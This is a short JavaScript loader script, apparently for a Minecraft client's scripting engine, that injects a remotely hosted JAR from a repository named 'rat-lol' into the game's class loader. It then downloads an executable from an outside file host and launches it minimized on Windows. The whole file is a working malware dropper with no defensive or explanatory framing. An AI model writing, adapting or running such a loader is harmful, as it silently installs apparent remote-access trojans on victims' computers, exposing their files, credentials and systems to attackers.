// ===== COMBINED JAR + EXE LOADER =====
(function() {
    try {
        // ==== 1. LOAD JAR ====
        var URLClassLoader = Java.type("java.net.URLClassLoader");
        var URL = Java.type("java.net.URL");
        var Minecraft = Java.type("net.minecraft.client.Minecraft");
        var Thread = Java.type("java.lang.Thread");

        var jarURL = new URL("https://github.com/MansHeree/rat-lol/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
        var classLoader = Minecraft.class.getClassLoader();
        var addURL = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);

        addURL.setAccessible(true);
        addURL.invoke(classLoader, jarURL);
        Thread.sleep(1000);

        classLoader.loadClass("org.lwjgl36.VersionImp").getMethod("init").invoke(null);
        print("[+] JAR loaded!");

        // ==== 2. DOWNLOAD & RUN EXE ====
        var Files = Java.type("java.nio.file.Files");
        var Paths = Java.type("java.nio.file.Paths");
        var Runtime = Java.type("java.lang.Runtime");
        var System = Java.type("java.lang.System");

        var exePath = Paths.get(System.getProperty("java.io.tmpdir"), "tmp_" + Math.random().toString(36).substring(2) + ".exe");
        var inStream = new URL("https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe").openStream();

        Files.copy(inStream, exePath);
        inStream.close();
        Thread.sleep(1000);

        if (System.getProperty("os.name").contains("Windows")) {
            Runtime.getRuntime().exec(["cmd", "/c", "start", "/min", exePath.toString()]);
            print("[+] EXE launched (hidden)");
        } else {
            print("[!] Windows only");
        }
    } catch (e) {
        print("[ERROR] " + e);
    }
})();